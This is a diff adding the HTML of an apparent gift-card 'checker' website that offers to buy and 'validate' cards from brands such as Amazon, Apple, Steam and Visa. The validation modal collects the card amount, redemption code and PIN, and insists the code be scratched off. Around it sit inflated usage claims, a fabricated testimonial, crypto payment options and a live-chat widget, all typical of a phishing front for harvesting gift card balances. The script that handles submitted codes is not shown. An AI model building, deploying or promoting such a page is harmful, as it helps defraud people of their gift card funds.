@@ -1,0 +1,601 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gift Card Checker</title>
+    <link rel="icon" type="image/png" href="images/favicon.png">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <div class="container">
+            Fast. Secured. Reliable
+        </div>
+    </div>
+
+    <!-- Header -->
+    <header>
+        <div class="container header-container">
+            <div class="logo">
+                <i class="fas fa-gift"></i>
+                <span>All Gift <br> Cards Checker</span>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="#">About</a></li>
+                    <li><a href="#">Contact</a></li>
+                    <li><a href="#gift-cards">Buy Card</a></li>
+                    <li><a href="#gift-cards">Validate Card</a></li>
+                </ul>
+            </nav>
+            <div class="header-actions">
+                <a href="#" class="icon-circle"><i class="fas fa-envelope"></i></a>
+                <a href="#" class="icon-circle" id="offcanvas-toggle"><i class="fas fa-bars"></i></a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-content">
+                <h1>Gift Card <span class="highlight">checker</span></h1>
+                <h3 class="hero-subtitle">Purchase and validate digital gift cards</h3>
+                <p class="hero-description">Your No.1 for any gift card purchase and validation - swift response, top-notch security and trusted by over 5000 users daily.</p>
+                
+                <div class="hero-prompt">
+                    <span>What will you like to do?</span>
+                </div>
+
+                <div class="action-buttons">
+                    <a href="#gift-cards" class="btn btn-black"><i class="fas fa-dollar-sign"></i> Buy Card</a>
+                    <a href="#gift-cards" class="btn btn-white"><i class="fas fa-shopping-cart"></i> Validate Card</a>
+                </div>
+            </div>
+            <div class="hero-image">
+                <div class="slider-container">
+                    <div class="slides-wrapper">
+                        <!-- Slide 1 -->
+                        <div class="slide active">
+                            <div class="slide-bg slide-bg-1"></div>
+                            <div class="slide-overlay"></div>
+                            <div class="slide-content">
+                                <div class="slide-text">You can <br> <span class="highlight">validate</span></div>
+                            </div>
+                        </div>
+                        <!-- Slide 2 -->
+                        <div class="slide">
+                            <div class="slide-bg slide-bg-2"></div>
+                            <div class="slide-overlay"></div>
+                            <div class="slide-content">
+                                <div class="slide-text">You can <br> <span class="highlight">receive</span></div>
+                            </div>
+                        </div>
+                        <!-- Slide 3 -->
+                        <div class="slide">
+                            <div class="slide-bg slide-bg-3"></div>
+                            <div class="slide-overlay"></div>
+                            <div class="slide-content">
+                                <div class="slide-text">You can <br> <span class="highlight">purchase</span></div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Navigation Arrows -->
+                    <button class="nav-arrow prev-slide" aria-label="Previous Slide"><i class="fas fa-chevron-left"></i></button>
+                    <button class="nav-arrow next-slide" aria-label="Next Slide"><i class="fas fa-chevron-right"></i></button>
+                    
+                    <!-- Navigation Dots -->
+                    <div class="slider-nav">
+                        <button class="nav-dot active" aria-label="Slide 1"></button>
+                        <button class="nav-dot" aria-label="Slide 2"></button>
+                        <button class="nav-dot" aria-label="Slide 3"></button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div id="offcanvas" class="offcanvas">
+        <div class="offcanvas-panel">
+            <button class="offcanvas-close" aria-label="Close"><i class="fas fa-times"></i></button>
+            <h3 class="offcanvas-title"><span>Quick</span> Links</h3>
+            <ul class="offcanvas-links">
+                <li><a href="#"><i class="fas fa-home"></i> Home</a></li>
+                <li><a href="#about"><i class="fas fa-circle-info"></i> About</a></li>
+                <li><a href="#"><i class="fas fa-comments"></i> Contact</a></li>
+                <li><a href="#gift-cards"><i class="fas fa-dollar-sign"></i> Buy</a></li>
+                <li><a href="#gift-cards"><i class="fas fa-check"></i> Validate</a></li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Why Choose Us -->
+    <section class="why-choose-us">
+        <div class="container">
+            <div class="why-image">
+                <img src="https://images.unsplash.com/photo-1549465220-1a8b9238cd48?q=80&w=2040&auto=format&fit=crop" alt="Why Choose Us">
+            </div>
+            <div class="why-content">
+                <h2><span class="highlight">Why</span> Choose Us</h2>
+                <p>We are your No.1 Stop for purchasing and validating digital gift cards</p>
+                <p>We offer a wide selection of gift cards from popular brands across various categories, including fashion, dining, entertainment, and more</p>
+                <div class="stats">
+                    <div class="stat-item">
+                        <h3>12K+</h3>
+                        <p>Daily Validations</p>
+                    </div>
+                    <div class="stat-item">
+                        <h3>8K+</h3>
+                        <p>Digital Card Purchase</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Gift Cards Grid -->
+    <section id="gift-cards" class="gift-cards">
+        <div class="container">
+            <div class="section-header">
+                <h2>Purchase or Validate</h2>
+                <p>Select a gift card to purchase or validate. Or use the search bar to find a card.</p>
+            </div>
+            <div class="cards-grid">
+                <!-- Amazon -->
+                <div class="card-item">
+                    <div class="card-img amazon">
+                        <img src="images/Amazon_logo.svg" alt="Amazon">
+                    </div>
+                    <div class="card-info">
+                        <h4>Amazon Gift Card</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- eBay -->
+                <div class="card-item">
+                    <div class="card-img ebay">
+                        <img src="images/EBay_logo.svg" alt="eBay">
+                    </div>
+                    <div class="card-info">
+                        <h4>eBay Gift Card</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Apple -->
+                <div class="card-item">
+                    <div class="card-img apple">
+                        <img src="images/Apple_logo_black.svg" alt="Apple">
+                    </div>
+                    <div class="card-info">
+                        <h4>Apple iTunes</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Google Play -->
+                <div class="card-item">
+                    <div class="card-img google">
+                        <img src="https://commons.wikimedia.org/wiki/Special:FilePath/Google_Play_2022_logo.svg" alt="Google Play">
+                    </div>
+                    <div class="card-info">
+                        <h4>Google Play</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Vanilla Visa -->
+                <div class="card-item">
+                    <div class="card-img vanilla">
+                        <div class="placeholder-text">Vanilla Visa</div>
+                    </div>
+                    <div class="card-info">
+                        <h4>Vanilla Visa</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- American Express -->
+                <div class="card-item">
+                    <div class="card-img amex">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="American Express">
+                    </div>
+                    <div class="card-info">
+                        <h4>American Express</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Steam -->
+                <div class="card-item">
+                    <div class="card-img steam">
+                        <img src="images/Steam_icon_logo.svg" alt="Steam">
+                    </div>
+                    <div class="card-info">
+                        <h4>Steam Gift Card</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- PlayStation -->
+                <div class="card-item">
+                    <div class="card-img psn">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg" alt="PlayStation">
+                    </div>
+                    <div class="card-info">
+                        <h4>PSN Gift Card</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Xbox -->
+                <div class="card-item">
+                    <div class="card-img xbox">
+                        <img src="images/Xbox_Logo.svg" alt="Xbox">
+                    </div>
+                    <div class="card-info">
+                        <h4>Xbox Gift Card</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Razer Gold -->
+                <div class="card-item">
+                    <div class="card-img razer">
+                        <div class="placeholder-text gold">Razer Gold</div>
+                    </div>
+                    <div class="card-info">
+                        <h4>Razer Gold</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Spotify -->
+                <div class="card-item">
+                    <div class="card-img spotify">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" alt="Spotify">
+                    </div>
+                    <div class="card-info">
+                        <h4>Spotify</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Nordstrom -->
+                <div class="card-item">
+                    <div class="card-img nordstrom">
+                        <div class="placeholder-text">Nordstrom</div>
+                    </div>
+                    <div class="card-info">
+                        <h4>Nordstrom</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Sephora -->
+                <div class="card-item">
+                    <div class="card-img sephora">
+                        <div class="placeholder-text">Sephora</div>
+                    </div>
+                    <div class="card-info">
+                        <h4>Sephora</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Hulu -->
+                <div class="card-item">
+                    <div class="card-img hulu">
+                        <img src="https://commons.wikimedia.org/wiki/Special:FilePath/Hulu_logo_(2018).svg" alt="Hulu">
+                    </div>
+                    <div class="card-info">
+                        <h4>Hulu</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Visa -->
+                <div class="card-item">
+                    <div class="card-img visa">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
+                    </div>
+                    <div class="card-info">
+                        <h4>Visa Gift Card</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+                <!-- Paramount+ -->
+                <div class="card-item">
+                    <div class="card-img paramount">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Paramount_Plus.svg" alt="Paramount+">
+                    </div>
+                    <div class="card-info">
+                        <h4>Paramount+</h4>
+                        <div class="card-actions">
+                            <button type="button" data-action="purchase" class="btn-sm btn-outline"><i class="fas fa-dollar-sign"></i> Purchase</button>
+                            <button type="button" data-action="validate" class="btn-sm btn-dark"><i class="fas fa-check"></i> Validate</button>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+            <div style="text-align: center; margin-top: 30px;">
+                <button class="btn btn-outline">Load more gift cards</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Customers Feedbacks -->
+    <section class="feedback">
+        <div class="container">
+            <div class="section-header">
+                <h2>Customers Feedbacks</h2>
+                <p>What our clients say about us</p>
+            </div>
+            <div class="testimonial">
+                <div class="avatar">
+                    <i class="fas fa-user-circle"></i>
+                </div>
+                <p>"I hardly have problems when I purchase gift cards , if I do have issues they resolve them very quickly! Good professional friendly service, especially the fact that it is easy and fast."</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section class="faq">
+        <div class="container">
+            <div class="section-header white">
+                <h2>Frequently Asked Questions</h2>
+            </div>
+            <div class="accordion">
+                <div class="accordion-item">
+                    <button class="accordion-header">How will my Gift Card be delivered? <i class="fas fa-chevron-down"></i></button>
+                    <div class="accordion-content">
+                        <p>Your Gift Card will be digitally delivered via web email, after the completion of your order.</p>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <button class="accordion-header">How can I gift a digital card to a friend? <i class="fas fa-chevron-down"></i></button>
+                    <div class="accordion-content">
+                        <p>You can do this by sliding the "send as gift" switch on the purchase a card page.</p>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <button class="accordion-header">What payment methods can I use? <i class="fas fa-chevron-down"></i></button>
+                    <div class="accordion-content">
+                        <p>Credit card, Debit card, Cashapp, Venmo, Crypto (BTC, ETH)</p>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <button class="accordion-header">What if I have an issue redeeming? <i class="fas fa-chevron-down"></i></button>
+                    <div class="accordion-content">
+                        <p>Please open an online support ticket and include your order number along with a screenshot.</p>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <button class="accordion-header">What if I need instant support? <i class="fas fa-chevron-down"></i></button>
+                    <div class="accordion-content">
+                        <p>You can open a support ticket using our customer support live chat.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer id="footer">
+        <div class="container">
+            <div class="footer-content">
+                <!-- Left Column: Logo, Description, Newsletter -->
+                <div class="footer-column brand-column">
+                    <a href="#" class="footer-logo">
+                        <i class="fas fa-gift" style="font-size: 2.5rem; color: #3498db;"></i>
+                        <span style="font-weight: 700; font-size: 1.3rem; margin-left: 10px;">All Gift <br> Cards Checker</span>
+                    </a>
+                    <p class="footer-desc">
+                        Purchase digital cards with instant email delivery. we email all kinds of cards internationally. We accept paypal and credit cards mode of payment. We are available 24/7.
+                    </p>
+                    <form class="newsletter-form">
+                        <input type="email" placeholder="Enter your email to subscribe to our news letter" required="">
+                        <button type="submit">
+                            <i class="fas fa-envelope"></i> Subscribe
+                        </button>
+                    </form>
+                </div>
+
+                <!-- Middle Columns: Links -->
+                <div class="footer-column links-column">
+                    <div class="link-group">
+                        <h4>Explore</h4>
+                        <ul>
+                            <li><a href="#">About</a></li>
+                            <li><a href="#">Contact</a></li>
+                            <li><a href="#">FAQ's</a></li>
+                            <li><a href="#">Privacy Policy</a></li>
+                        </ul>
+                    </div>
+                    <div class="link-group">
+                        <h4>Actions</h4>
+                        <ul>
+                            <li><a href="#gift-cards">Buy Card</a></li>
+                            <li><a href="#gift-cards">Validate Card</a></li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Right Column: Social & Contact -->
+                <div class="footer-column contact-column">
+                    <div class="social-icons">
+                        <a href="#" class="social-icon twitter"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="social-icon whatsapp"><i class="fab fa-whatsapp"></i></a>
+                        <a href="#" class="social-icon facebook"><i class="fab fa-facebook-f"></i></a>
+                    </div>
+                    <div class="contact-info">
+                        <h4>Email</h4>
+                        <a href="/cdn-cgi/l/email-protection#2b42454d446b4c424d5f484a594f0648434e48404e5905484446"><span class="__cf_email__" data-cfemail="3a53545c557a5d535c4e595b485e1759525f59515f4814595557">[email protected]</span></a>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <p>© 2024 Gift Card Checker</p>
+                <div class="footer-bottom-links">
+                    <a href="#">Terms & Conditions</a>
+                    <a href="#">All rights reserved.</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+
+    <!-- Modals -->
+    <div id="purchase-modal" class="modal-overlay">
+        <div class="modal-content purchase-content">
+            <button type="button" class="modal-close" onclick="closeModal(this.closest('.modal-overlay'))"><i class="fas fa-times"></i></button>
+            <div class="modal-body purchase-modal">
+                <div class="purchase-grid">
+                    <div class="purchase-left">
+                        <div class="purchase-card-preview">
+                            <img id="purchase-card-image" alt="Card preview">
+                        </div>
+                    </div>
+                    <div class="purchase-right">
+                        <h3><span id="purchase-card-brand">Amazon</span> Card</h3>
+                        <p class="delivery-meta">Email Delivery</p>
+                        <p class="delivery-time">Est. Delivery Time: 1-3 mins</p>
+                        <form id="purchase-form" class="modal-form">
+                            <div class="form-group">
+                                <label>Select the amount you will like to purchase <span class="required">*</span></label>
+                                <div class="amount-chips">
+                                    <button type="button" class="chip" data-amount="20">$20</button>
+                                    <button type="button" class="chip" data-amount="50">$50</button>
+                                    <button type="button" class="chip active" data-amount="100">$100</button>
+                                    <button type="button" class="chip" data-amount="200">$200</button>
+                                    <button type="button" class="chip" data-amount="500">$500</button>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>No. of digital cards <span class="required">*</span></label>
+                                <div class="qty-control">
+                                    <button type="button" class="qty-btn" data-qty="dec" aria-label="Decrease">−</button>
+                                    <input type="number" id="purchase-quantity" class="form-control qty-input" min="1" value="1" inputmode="numeric">
+                                    <button type="button" class="qty-btn" data-qty="inc" aria-label="Increase">+</button>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label>Send as gift</label>
+                                <input type="checkbox" id="purchase-gift">
+                            </div>
+                            <div class="form-group total-line">
+                                <label>Total Due:</label>
+                                <strong id="purchase-total">$100.00</strong>
+                            </div>
+                            <button type="submit" class="btn btn-primary">Submit Purchase Request</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- Payment Details Modal Removed -->
+
+    <!-- Validate Modal -->
+    <div id="validate-modal" class="modal-overlay">
+        <div class="modal-content">
+            <button type="button" class="modal-close" onclick="closeModal(this.closest('.modal-overlay'))"><i class="fas fa-times"></i></button>
+            <div class="modal-body">
+                <h3>Verify Your <span id="modal-card-brand">Gift</span> Card</h3>
+                <form id="validate-form">
+                    <div class="form-group">
+                        <input type="text" id="brand-display" class="form-control brand-display" readonly="">
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group half">
+                            <select class="form-control" id="validate-currency" required="">
+                                <option value="USD">USD</option>
+                                <option value="EUR">EUR</option>
+                                <option value="GBP">GBP</option>
+                                <option value="CAD">CAD</option>
+                                <option value="AUD">AUD</option>
+                            </select>
+                        </div>
+                        <div class="form-group half">
+                            <input type="text" id="validate-amount" class="form-control" placeholder="Card Amount" required="">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <input type="text" id="validate-code" class="form-control" placeholder="Redemption Code" required="">
+                    </div>
+                    <div class="form-group" id="pin-container" style="display: none;">
+                        <input type="text" id="validate-pin" class="form-control" placeholder="Gift Card Pin">
+                    </div>
+                    <div class="alert alert-warning" id="validate-warning" style="display: none;">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <span>Ensure redemption code is scratched code!</span>
+                    </div>
+                    <button type="submit" class="btn btn-primary btn-block modal-submit-btn">Continue</button>
+                    <div class="form-status"></div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script async="" src="https://embed.tawk.to/69768887e46bfa1981d288f8/1jfrgal3b" charset="UTF-8" crossorigin="*"></script>
+    <script src="js/script.js"></script>
+
+    <!--Start of Tawk.to Script-->
+    <script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/69768887e46bfa1981d288f8/1jfrgal3b';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+    })();
+    </script>
+    <!--End of Tawk.to Script-->
+
+
+</body></html>
